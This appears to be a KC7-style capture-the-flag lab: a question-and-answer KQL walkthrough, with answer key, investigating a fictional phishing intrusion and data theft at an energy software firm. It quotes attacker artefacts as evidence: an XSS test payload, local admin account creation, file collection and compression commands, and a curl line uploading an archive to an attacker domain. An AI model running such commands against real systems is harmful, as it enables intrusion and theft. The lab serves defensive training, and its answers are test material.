# Solvi Systems

# Section 1: KQL 101

### Question 1

**Welcome to Solvi Systems!**

Solvi Systems is a software company that plays a pivotal role in shaping the future of the energy sector in South Africa. At the heart of Solvi Systems' operations is its Docks software, a critical component used by major power and utility companies.

![](https://kc7photos.blob.core.windows.net/manualphotos/solvilogo2.png)

Solvi Systems' influence extends beyond national borders. The company plays a crucial role in regional stability, as South Africa exports power to neighboring states like Mozambique, Eswatini, Zimbabwe, and Namibia. This interconnectedness means that any vulnerability or disruption in South Africa's energy infrastructure, and by extension Solvi Systems' software, doesn't just affect one nation but echoes across the region.

Given this key role, Solvi Systems is a prime target for cyber adversaries. You've been hired to identify any intrusions against this company.

Enter `ready` to get started

### Question 2

To start your investigation, you will need access to the company's pool of data!

1. *Login to [Azure Data Explorer (ADX)](https://dataexplorer.azure.com/clusters/kc7001.eastus/databases/SolviSystems). This is where you will find our TOP SECRET data. You will need a Microsoft account (hotmail, outlook, O365..) We will use ADX to run queries that will help us answer these questions.*
2. *The [training guide](https://kc7cyber.com/guide/148) will teach you how to answer the KQL101 questions.*

Run a **take** 10 on each of the tables to see what kind of data they contain.

```sql
Employees
| take 10
```

Anytime you're stuck while trying to write a query, you can always use **take** 10 to remind yourself what columns and values are in that table!

**Type "done" to earn credit for this question.**

### Question 3

Now that we have access to the data, we'll need to get a lay of the land. Let's get some more information about Solvi Systems.

**How many employees work at Solvi Systems?**

```sql
Employees
| count
```

> `500`
> 

### Question 4

We can use the **where** operator with the Employees table to find a specific employee.

**What is the CTO's name?**

> `Alexis Khoza`
> 

```sql
Employees
| where role == "CTO"
```

### Question 5

We can learn more about `Alexis Khoza` using information from other tables. Let's take her email address from the Employees table and use it in a query for the Email table.

**How many emails did Alexis Khoza receive?**

> `31`
> 

```sql
Email
| where recipient == "alexis_khoza@solvisystems.com"
| count 
```

### Question 6

You can use the **distinct** operator to find unique values in a specific column.

**How many distinct senders were seen in the email logs from eskom.co.za?**

```sql
Email
| where sender has "<Domain Name>"
| distinct <field>
| count
```

> `745`
> 

```sql
Email
| where sender endswith "eskom.co.za"
| distinct sender
| count
```

### Question 7

**How many distinct websites did “Alexis Khoza” visit?**

> `72`
> 

```sql
OutboundNetworkEvents
| where src_ip == "10.10.0.7"
| distinct url
| count 
```

### Question 8

**How many distinct domains in the PassiveDns records contain the word “real”?**

> `19`
> 

```sql
PassiveDns
| where domain contains "real"
| distinct domain
```

### Question 9

**What IPs did the domain “bit.ly” resolve to (enter any one of them)?**

> `219.82.23.42`
> 

```sql
PassiveDns
| where domain contains "bit.ly"
| distinct ip
```

### Question 10

**How many distinct URLs did employees with the first name "Mary" Visit?**

> `847`
> 

```sql
let ips = Employees
| where name startswith "Mary"
| distinct ip_addr;
OutboundNetworkEvents
| where src_ip in (ips)
| distinct url
| count
```

### Question 11

**How many authentication attempts did we see to the accounts of employees with the first name Mary?**

> `1150`
> 

```sql
let users = Employees
| where name startswith "Mary"
| distinct username;
AuthenticationEvents
| where username  in (users)
| count
```

### Question 12

Congratulations! 🥳 You've passed KQL 101! Let's dive into the investigation! 🔎

**Enter "ready" to earn credit for this question.**

# Section 2: Someone’s knocking

### Question 1

Our mission is to identify any intrusion attempts against Solvi Systems. In order to do this, we'll start by reviewing some alerts.

You got an alert from your Web Application Firewall (WAF) appliance that someone may be trying to compromise your Solvi System's website!

```json
{
   description: "DETECTION RULE TRIGGERED",
   severity: "HIGH",
   rule_description: "SUSPICIOUS TEXT IN HTTP REQUEST",
   data: https://www.solvisystems.com/feedback?message=</script>. 
 <script>alert('xss')</script>
}
```

**What kind of attack does the alert suggest happened?**

> `XSS`
> 

### Question 2

We can actually identify this request in our inbound browsing logs.

> `alert()`
> 

```sql
InboundNetworkEvents
| where url contains "alert"
```

### Question 3

Fortunately, it looks like they didn't have much luck!

**What response code did they receive from the website?**

> `404`
> 

### Question 4

Let's take some notes on the details of this event. These details may help us find more malicious activity later.

**What user agent did the attackers use to make the web requests in this attack? Enter only the initial part of the user agent (XXXXX/N.NN).**

> `Opera/8.64`
> 

### Question 5

**On what day did the attack happen? Give the timestamp in the format YYYY-MM-DD.**

> `2024-05-03`
> 

### Question 6

Ok, that first attempt was unsuccessful but it may not have been the only one.

Let's look for other malicious requests the attacker could have made around that time. It looks like the attacker varied the ip addresses they used to make these requests.

**How many malicious requests did the attacker make in total?**

> `9`
> 

```sql
InboundNetworkEvents
| where timestamp between (datetime("2024-05-03") .. datetime("2024-05-05"))
| where user_agent == "Opera/8.64.(X11; Linux x86_64; kok-IN) Presto/2.9.165 Version/10.00"
```

### Question 7

**Were any of these attacks successful? (yes/no)**

> `No`
> 

### Question 8

**What IP addresses did the requests originate from? (Enter any of them.)**

> `105.78.23.64`
> 
```sql
InboundNetworkEvents
| where user_agent == "Opera/8.64.(X11; Linux x86_64; kok-IN) Presto/2.9.165 Version/10.00"
| distinct src_ip
```

```
98.117.26.236
105.78.23.64
56.6.30.190
13.201.46.208
```

### Question 9

It looks like the threat actor did some reconnaissance prior to the attack. They were seen browsing the company website before sending malicious requests to it.

**How many total records do we have of them browsing Solvi Systems?**

> `64`
> 

```sql
InboundNetworkEvents
| where url contains "solvisystems"
| where user_agent == "Opera/8.64.(X11; Linux x86_64; kok-IN) Presto/2.9.165 Version/10.00"
```

### Question 10

Now that we know more about the threat actors' infrastructure, we can pivot out even further and see what else the threat actor may have done.

**What is the timestamp of the first web request the threat actor sent to Solvi System's website?**

> `5/1/2024, 12:00:00 AM`
> 

```sql
InboundNetworkEvents
| where url contains "solvisystems"
| where user_agent == "Opera/8.64.(X11; Linux x86_64; kok-IN) Presto/2.9.165 Version/10.00"
| order by timestamp asc
```

### Question 11

Looks like the threat actors did some research beforehand. They were interested in one very special software developed by Solvi Systems.

**Which product did the threat actors research before the day that they sent the malicious web requests?**

> `docks-ics`
> 

```sql
InboundNetworkEvents
| where url contains "solvisystems"
| where user_agent == "Opera/8.64.(X11; Linux x86_64; kok-IN) Presto/2.9.165 Version/10.00"
| order by timestamp asc
| project-keep url
```

![image.png](Solvi%20Systems%202597141dc5438016b078c4d942819335/image.png)

### Question 12

So we know the web exploitation attempts failed, but surely that couldn't be the end of it. Based on the reconnaissance we saw, these threat actors were far too interested in Solvi Systems to give up that easily.

Let's try pivoting on the adversary infrastructure to see if they tried to get in some other way.

First we'll look in PassiveDns to see if there are any domains registered by the adversary.

**How many distinct domains do the ip addresses used by the threat actor resolve to?**

> `3`
> 

```sql
let ips = InboundNetworkEvents
| where timestamp between (datetime("2024-05-03") .. datetime("2024-05-05"))
| where user_agent == "Opera/8.64.(X11; Linux x86_64; kok-IN) Presto/2.9.165 Version/10.00"
| distinct src_ip;
PassiveDns
| where ip in (ips)
| distinct domain
```

```bash
energy-trends4u.net
news-on-industry.com
eco-awareness-update.net
```

### Question 13

Hmmm… These domains smell like they were registered for nefarious purposes. Perhaps for…phishing?

Let's check out the email logs to confirm.

**Did we receive any emails containing these domains? (yes/no)**

> `yes`
> 

```sql
Email
| where link has_any ("energy-trends4u.net", "news-on-industry.com", "eco-awareness-update.net")
```

# Section 3: Snail Mail

### Question 1

Oh no! We received so many malicious emails. They weren't done after all!

Good news: we have new leads in our investigation. Bad news: we have more investigating to do!

Let's explore these malicious emails that were sent by the adversary.

**How many emails associated with these domains did SolviSystem employees receive?**

> `56`
> 

```sql
Email
| where link has_any ("energy-trends4u.net", "news-on-industry.com", "eco-awareness-update.net")
| count
```

### Question 2

Before we move on, let's try to get a better scope of the investigation.

You'll answer the following questions about the `56` emails we found earlier that had the adversary domains.

**How many distinct email addresses did the threat actor use?**

> `3`
> 

```sql
Email
| where link has_any ("energy-trends4u.net", "news-on-industry.com", "eco-awareness-update.net")
| distinct sender
```

### Question 3

**How many distinct filenames were observed in the links in these emails?**

> `3`
> 

```bash
http://news-on-industry.com/search/online/files/public/~~Energy_Industry_Trends_2024_4_Solvi.docx~~
https://eco-awareness-update.net/online/images/~~Recent_Mergers_and_Acquisitions_in_Energy_Industry.docx~~
http://energy-trends4u.net/modules/Recent_Mergers_and_Acquisitions_in_Energy_Industry.docx
https://news-on-industry.com/search/online/published/Energy_Industry_Trends_2024_4_Solvi.docx
http://eco-awareness-update.net/published/online/Recent_Mergers_and_Acquisitions_in_Energy_Industry.docx
https://news-on-industry.com/published/images/Energy_Industry_Trends_2024_4_Solvi.docx
http://energy-trends4u.net/public/share/files/Energy_Industry_Trends_2024_4_Solvi.docx
https://news-on-industry.com/public/Recent_Mergers_and_Acquisitions_in_Energy_Industry.docx
http://energy-trends4u.net/online/modules/published/files/Energy_Industry_Trends_2024_4_Solvi.docx
http://energy-trends4u.net/images/search/images/images/~~Eco_Awareness_Update_2024.docx~~
https://energy-trends4u.net/published/online/modules/online/Recent_Mergers_and_Acquisitions_in_Energy_Industry.docx
http://energy-trends4u.net/public/Recent_Mergers_and_Acquisitions_in_Energy_Industry.docx
https://eco-awareness-update.net/online/files/Recent_Mergers_and_Acquisitions_in_Energy_Industry.docx
http://energy-trends4u.net/modules/published/public/Recent_Mergers_and_Acquisitions_in_Energy_Industry.docx
```

### Question 4

Let's look into the employee roles that this threat actor was targeting.

**How many different roles were targeted with these emails?**

> `5`
> 

```sql
let targted_emails = Email
| where link has_any ("energy-trends4u.net", "news-on-industry.com", "eco-awareness-update.net") and link endswith ".docx"
| distinct recipient;
Employees
| where email_addr in (targted_emails)
| distinct 
```

### Question 5

**How many Customer Support Specialist employees received malicious emails?**

> `27`
> 

```sql
let targeted_roles = Email
| where link has_any ("energy-trends4u.net", "news-on-industry.com", "eco-awareness-update.net") and link endswith ".docx"
| distinct recipient;
Employees
| where email_addr in (targeted_roles)
| where role == "Customer Support Specialist"
| count
```

### Question 6

**Among these job roles, which word is shared by three of them?**

> `Docks`
> 

```sql
let targeted_roles = Email
| where link has_any ("energy-trends4u.net", "news-on-industry.com", "eco-awareness-update.net") and link endswith ".docx"
| distinct recipient;
Employees
| where email_addr in (targeted_roles)
| distinct role
```

```
Sales Representative
Customer Support Specialist
DOCKS ICS Security Lead
Project Manager for Docks ICS
Docks Customer Success Manager
```

### Question 7

We can't investigate all of the emails at once so we'll start by looking in detail at one of the emails.

**What was the timestamp of the first email the threat actor sent?**

> `5/1/2024, 3:51:41 PM`
> 

```sql
Email
| where link has_any ("energy-trends4u.net", "news-on-industry.com", "eco-awareness-update.net")
| sort by timestamp asc
```

### Question 8

**What is the recipient's email address?**

> `carla_wharton@solvisystems.com`
> 

### Question 9

**What is that employee's name?**

> `Carla Wharton`
> 

```sql
Employees
| where email_addr == "carla_wharton@solvisystems.com"
```

### Question 10

**What was the sender address of that email?**

> **`news@eco-awareness-updates.net`**
> 

```sql
Email
| where link has_any ("energy-trends4u.net", "news-on-industry.com", "eco-awareness-update.net")
| sort by timestamp asc
```

### Question 11

**What was the reply to address?**

> `electric_updates@gmail.com`
> 

### Question 12

**What was the subject of that email?**

> **`[EXTERNAL] Business Opportunity: Two major energy companies merging`**
> 

### Question 13

**What link was observed in the email?**

> `http://news-on-industry.com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx`
> 

### Question 14

**Did Carla click on the link in email? If so when?**

> `2024-05-01T15:57:41Z`
> 

```sql
OutboundNetworkEvents
| where src_ip == "10.10.0.164" and url == "http://news-on-industry.com/search/online/files/public/Energy_Industry_Trends_2024_4_Solvi.docx"

```

### Question 15

**What file was observed on Carla's machine shortly after she executed the docx file?**

> `ecobug.exe`
> 

```sql
FileCreationEvents
| where timestamp >= datetime(5/1/2024, 3:57:41 PM) and hostname == "JUSP-LAPTOP"
```

### Question 16

What was the hash of the file?

> `1c3ef0407d5714037504c52f7abfa86c081fd7a021b52e2abe8a669f92413252`
> 

# Section 4: Ecoshock

### Question 1

**How many records do we have of this file being created on Solvi Systems computers?**

> `39`
> 

```sql
FileCreationEvents
| where filename == "ecobug.exe"
```

### Question 2

Let's go back and look at the process events on Carla's machine to see what happens after ecobug.exe is created.

**What IP address does ecobug.exe connect to in order to establish persistence?**

> `98.117.26.236`
> 

```sql
ProcessEvents
| where timestamp >= datetime(5/1/2024, 3:57:41 PM) and hostname == "JUSP-LAPTOP"
| project-keep process_commandline
```

![image.png](Solvi%20Systems%202597141dc5438016b078c4d942819335/image%201.png)

### Question 3

**What is the port number that is used?**

> `1337`
> 

### Question 4

We can now examine the NetworkFlow data to observe the persistent connection.

**How many times does Carla's machine connect to the suspicious IP address?**

> `24`
> 

```sql
NetworkFlow
| where dest_ip == "98.117.26.236" and src_ip == "10.10.0.164" //Carla Machine IP
| summarize count() by timestamp
```

![image.png](Solvi%20Systems%202597141dc5438016b078c4d942819335/image%202.png)

### Question 5

**How many times a day does Carla's machine make its recurring connection to the suspicious IP?**

> `1`
> 

### Question 6

**At what time does this connection take place? (format hh:mm:ss)**

> `17:38:25`
> 

### Question 7

**How many total connections do we see between this IP and Solvi Systems employee machines?**

> `470`
> 

```sql
NetworkFlow
| where dest_ip == "98.117.26.236"
```

### Question 8

**How many distinct employee machines are involved in those connections?**

> `38`
> 

```sql
NetworkFlow
| where dest_ip == "98.117.26.236"
| distinct src_ip
```

### Question 9

We've gained some pretty good information on how the malware communicated with the threat actor's infrastructure. Let's go back to the malware to see what actions it performed on the victims' machines.

A day after the malware is first executed the threat actor attempts to create a new user and add that user to the local administrators group.

**What is the name of the newly created user?**

> `gu@rd!an`
> 

```sql
ProcessEvents
| where timestamp >= datetime(5/1/2024, 3:57:41 PM) and hostname == "JUSP-LAPTOP"
| project-keep process_commandline
```

![image.png](Solvi%20Systems%202597141dc5438016b078c4d942819335/image%203.png)

### Question 10

**What is that user's password?**

> `abc1toothree`
> 

### Question 11

After the malware was executed on Carla's machine, a series of commands were run relating to reconnaissance on the compromised system.

We can find these discovery commands.

**What was the last `discovery` command that the adversaries ran?**

> `net use`
> 

![image.png](Solvi%20Systems%202597141dc5438016b078c4d942819335/image%204.png)

# Section 5: A shocking ending

### Question 1

Looks like we hit a dead end. The threat actors didn't seem interested enough to do anything else on Carla's machine.

We can use this as an anchor point though. Perhaps the threat actor is a creature of habit.

**How many distinct commands containing the term `net use` were run on SolviSystem devices?**

> `2`
> 

```sql
ProcessEvents
| where process_commandline has "net use"
| distinct process_commandline
```

### Question 2

**What new command using `net use` did we find?**

> `net use /PERSISTENT:YES`
> 

```powershell
net use /*/Lists all current network connections to shared resources.*
net use /PERSISTENT:YES *//Enables persistent connections. This means network connections you create with net use will be saved and restored automatically every time you log in or restart your computer.*
```

### Question 3

Let's investigate the use of `net use /PERSISTENT:YES` further.

**How many distinct hosts was this command run on?**

> `3`
> 

```sql
ProcessEvents
| where process_commandline == "net use /PERSISTENT:YES"
| distinct hostname
```

### Question 4

**What is the timestamp for the first time this command was run?**

> `5/27/2024, 4:23:10 PM`
> 

```sql
ProcessEvents
| where process_commandline == "net use /PERSISTENT:YES"
```

### Question 5

**What is the hostname from that timestamp?**

> `SJ9V-MACHINE`
> 

### Question 6

**Who is the employee associated with that hostname?**

> `Alexei Petrov`
> 

```sql
Employees
| where hostname == "SJ9V-MACHINE"
```

### Question 7

**What is that employee's role?**

> `Docks Customer Success Manager`
> 

### Question 8

Now let's go back and see if there were other commands run on Alexei's machine after `net use /PERSISTENT:YES`.

It looks like the adversary was copying files from a network share onto Alexei's machine.

**What is the command used to copy files related to `SoftwareDevelopment`?**

> `Copy-Item -Path \\\\solvisystems.com\\SharedDocs\\SoftwareDevelopment\\CycleDocuments\\* -Destination C:\\Users\\alpetrov\\CollectedData\\Software_Cycle_Docs`
> 

```sql
ProcessEvents
| where hostname == "SJ9V-MACHINE" and timestamp >= datetime(5/27/2024, 5:11:58 PM)
```

```
Copy-Item -Path \\\\solvisystems.com\\SharedDocs\\SoftwareDevelopment\\CycleDocuments\\* -Destination C:\\Users\\alpetrov\\CollectedData\\Software_Cycle_Docs
Compress-Archive -Path C:\Users\alpetrov\CollectedData\* -DestinationPath C:\DataExfil\CollectedData.zip
C:\Windows\system32\dmclient.exe utcwnf
"C:\Windows\system32\backgroundTaskHost.exe" -ServerName:Microsoft.MicrosoftOfficeHub.AppX54h2e8jwdm50fj5ha8987vz1etpx7czd.mca
"C:\Program Files\Microsoft Office\root\Office16\sdxhelper.exe" /onlogon
C:\Windows\Sysmon64.exe
"C:\Program Files\WindowsApps\SpotifyAB.SpotifyMusic_1.190.859.0_x86__zpdnekdrzrea0\Spotify.exe" --type=crashpad-handler /prefetch:7 
"C:\Program Files (x86)\Microsoft Office\Office14\OUTLOOK.EXE" 
"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" 
"C:\Program Files\WindowsApps\MicrosoftTeams_22183.300.1431.9295_x64__8wekyb3d8bbwe\msteamsupdate.exe" -CheckUpdate -AppSessionGUID 
curl -F 'file=@C:\DataExfil\CollectedData.zip' https://api.eco-awareness-update.net/upload
"C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\microsoftedgecp.exe" SCODEF:2500 CREDAT:206085 EDGEHOST  /prefetch:6
C:\Windows\system32\svchost.exe -k wusvcs -p -s WaaSMedicSvc
```

### Question 9

After collecting the sensentive data, the adversary compressed it and moved it to another location.

**What is the name of the archive file containing the copied documents?**

> `CollectedData.zip`
> 

### Question 10

**The next day the data was exfiltrated using what command?**

> `curl -F 'file=@C:\DataExfil\CollectedData.zip' https://api.eco-awareness-update.net/upload`
> 

### Question 11

**How many accounts were used by the threat actor to exfiltrate sensitive information from Solvi Systems?**

> `3`
> 

```sql
ProcessEvents
| where process_commandline contains "curl -F"
```

### Question 12

The adversaries appeared to be highly invested in learning more about Solvi's software development process. Perhaps they want to be better understand Solvi's code bases, or figure out how to inject their own malicious code in Solvi's software.

Around the same time the adversaries stole data from the network share about the software lifecycle, they were also seen accessing sensitive documents about the software lifecycle.

**The threat actors were observed reading an "internal process" document from an internal portal called `____.solvisystems.com`**

> `devportal`
> 

```sql
InboundNetworkEvents
| where url has "internal"
```

![image.png](Solvi%20Systems%202597141dc5438016b078c4d942819335/image%205.png)

### Question 13

The adversaries also tried going an unconventional route and simply asking nicely 🤣 for details about the SDLC using the compromised user's accounts.

These compromised users sent a few emails prodding for information about the location of important software documentation.

**What was the subject of those emails?**

> `Do you know where the DOCKS software documentation is stored? 🤪`
> 

```sql
Email
| where sender has "alexei" and subject has "documentation" //Alexei Petrov was compromised
| project-keep subject
```

```
Urgent Request: DOCKS System Documentation 🚨
Urgent Request: DOCKS System Documentation 🚨
Urgent Request: DOCKS System Documentation 🚨
Do you know where the DOCKS software documentation is stored? 🤪
Do you know where the DOCKS software documentation is stored? 🤪
Do you know where the DOCKS software documentation is stored? 🤪
```

### Question 14

Congratulations! You've completed your investigation.

**Type "wooo" to receive credit**

### Question 15

The day after your investigation, you receive an ominous message over email.

![](https://kc7photos.blob.core.windows.net/manualphotos/god_tweets2.png)

**Type "guardians" to finish this module. Stay tuned for the next module to see what the guardians might do next!** 😱
